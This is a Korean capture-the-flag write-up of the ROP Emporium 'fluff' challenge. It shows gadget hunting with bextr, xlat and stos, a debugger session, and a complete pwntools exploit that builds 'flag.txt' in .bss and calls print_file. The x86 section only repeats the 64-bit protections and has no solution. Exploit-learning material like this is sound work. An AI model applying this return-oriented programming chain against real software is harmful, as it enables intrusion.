# [fluff](https://ropemporium.com/challenge/fluff.html)
<br />

**Description:**
> The concept here is similar to the write4 challenge, although we may struggle to find simple gadgets that will get the job done.

<br />
<br />

# x86_64

**Binary Protections:**
```yaml
fluff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2b14d9e5fb7a6bcac48b5304b5153fc679c3651c, not stripped

[*] '/home/kali/ROP/fluff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

해당 문제에서는 이전 문제에서 유용하게 사용한 `mov` 가젯을 제공하지 않습니다. 대신 `bextr` 등 생소한 가젯들을 제공하며, 제공된 가젯으로 `"flag.txt"`를 만들어 인자로 전달하면 풀리는 문제입니다.

먼저 풀이를 위해 필요한 가젯을 수집합니다.

<br />

```yaml
$ ROPgadget --binary fluff | grep rdi
0x00000000004006a3 : pop rdi ; ret
```
```yaml
$ objdump -d fluff
Disassembly of section .text:
...
0000000000400617 <usefulFunction>:
  400617:       55                      push   %rbp
  400618:       48 89 e5                mov    %rsp,%rbp
  40061b:       bf c4 06 40 00          mov    $0x4006c4,%edi
  400620:       e8 eb fe ff ff          call   400510 <print_file@plt>
  400625:       90                      nop
  400626:       5d                      pop    %rbp
  400627:       c3                      ret

0000000000400628 <questionableGadgets>:
  400628:       d7                      xlat   %ds:(%rbx)
  400629:       c3                      ret
  40062a:       5a                      pop    %rdx
  40062b:       59                      pop    %rcx
  40062c:       48 81 c1 f2 3e 00 00    add    $0x3ef2,%rcx
  400633:       c4 e2 e8 f7 d9          bextr  %rdx,%rcx,%rbx
  400638:       c3                      ret
  400639:       aa                      stos   %al,%es:(%rdi)
  40063a:       c3                      ret
  40063b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
```
- `pop rdi ; ret = 0x4006a3`
- `print_file_plt = 0x400510`
- `xlat ; ret = 0x400628`
- `pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret = 0x40062a`
- `stos ; ret = 0x400639`

<br />

> [!NOTE]
> [xlat](https://www.felixcloutier.com/x86/xlat:xlatb) 는 `[rbx + al] = al`을 수행합니다. 즉, `rbx`로부터 `al`만큼 떨어진 주소의 1바이트를 `al`에 저장합니다.
>
> [bextr](https://www.felixcloutier.com/x86/bextr) 의 형식은 `BEXTR dest, src, ctrl`이고, `dest = (src >> Start) & ((1 << Length) - 1)`를 수행합니다. `ctrl[7:0]`은 `start`, `ctrl[15:8]`은 `length`를 의미합니다. 따라서 `bextr`은 `src`를 `start`에서부터 `length`만큼 비트를 자르고 제로확장을 하여 `dest`에 저장합니다.
> ```yaml
> > bextr rbx, rcx, rdx
> rcx = 0xDEADBEEFDEADBEEF, rdx = 0x0804(start=4, len=8)
> Input : 1101111010101101101111101110111111011110101011011011111011101111 = 0xDEADBEEFDEADBEEF
>                                                             |------|
>                                                                 \
>                                                                  \
>                                                                   \
>                                                                    v
>                                                                 |------|
> Output: 0000000000000000000000000000000000000000000000000000000011101110 = 0x00000000000000EE
> ```
> [stos](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq) 는 레지스터의 값을 메모리에 저장하고 , `rdi`를 자동으로 증가시키는 역할을 수행합니다. `stos` 종류에 따라 저장 단위와 증가량이 달라집니다.


<br />

```bash
$ r2 fluff
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00400520]> is
[Symbols]
nth paddr      vaddr      bind   type   size lib name                                   demangled
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
...
24  ---------- 0x00601038 LOCAL  SECT   0        .bss
...

[0x00400520]> / f
0x004003c4 hit0_0 .libfluff.so__gmon_s.
...
[0x00400520]> / l
0x00400239 hit1_0 ./lib64/ld-linux-x8.
...
[0x00400520]> / a
0x004003d6 hit2_0 .uff.so__gmon_start__print_file.
...
[0x00400520]> / g
0x004003cf hit3_0 .libfluff.so__gmon_start__prin.
...
[0x00400520]> / .
0x0040024e hit4_0 ./ld-linux-x86-64.so.2.
...
[0x00400520]> / t
0x00400192 hit5_0 .Ptd@.
...
[0x00400520]> / x
0x00400246 hit6_0 ./lib64/ld-linux-x86-64.so.2.
...
```
위에서 구한 가젯 조합으로 `bss`에 1바이트씩 문자열을 저장할 수 있습니다. 하지만 해당 바이너리에는 `"flag.txt"` 문자열이 없으므로, 문자열을 직접 구해야 합니다. 문자열 주소는 `radare2`로 쉽게 찾을 수 있습니다.
<br />

위 가젯들로 문자열 `"f"`를 추출하겠습니다.

<br />

```yaml
$ gdb fluff -q
...
pwndbg> start
...

pwndbg> x/s 0x004003c4
0x4003c4:       "fluff.so"
pwndbg> x/a 0x004003c4
0x4003c4:       0x6f732e6666756c66
pwndbg> i r $al
al             0xb                 11
pwndbg> set $rcx=0x4003c4 - 11
pwndbg> set $rdx=0x2000
pwndbg> set $rip=0x400633
pwndbg> si
...
pwndbg> set $rip=0x400628
pwndbg> si
...
pwndbg> i r $al
al             0x66                102
```
필요한 레지스터를 세팅하고 `bextr`, `xlat`를 순서대로 호출하면 `al`에 `[rcx]`의 1바이트가 저장된 것을 알 수 있습니다. 이 방법으로 `"flag.txt"`를 만들 수 있습니다.

> [!Caution]
> `xlat`은 `[rbx + al]`에 위치한 1바이트를 `al`에 저장합니다. 위 디버깅 중 레지스터를 세팅하기 전 `al`의 초기 값은 `11`임을 알 수 있습니다. 이 부분을 고려하지 않고 공격 코드를 작성하면 원하는 문자열이 만들어지지 않으므로 주의해야 합니다.

<br />
<br />

```python
from pwn import *

context.log_level = 'error'
context.bits = 64

p = process('./fluff')

def write_byte():
    al = 11  # initial al = 11
    pay = flat(pop_rdi, bss)
    for c in target:
        rcx = flag_addr[c]-al-0x3ef2
        pay += flat(bextr, 0x2000, rcx, xlat, stos)

        al = ord(c)
    return pay

bextr = 0x40062a  # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
xlat = 0x400628
stos = 0x400639

pop_rdi = 0x4006a3
bss = 0x601038
print_file = 0x400510

flag_addr = {
  'f': 0x004003c4, 'l': 0x00400239,
  'a': 0x004003d6, 'g': 0x004003cf,
  '.': 0x0040024e, 't': 0x00400192,
  'x': 0x00400246
}

target = 'flag.txt'

pay = b'A'*40
pay += write_byte()
pay += flat(pop_rdi, bss, print_file)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```

<br />
<br />

# x86

**Binary Protections:**
```yaml
fluff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2b14d9e5fb7a6bcac48b5304b5153fc679c3651c, not stripped

[*] '/home/kali/pico/fluff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />
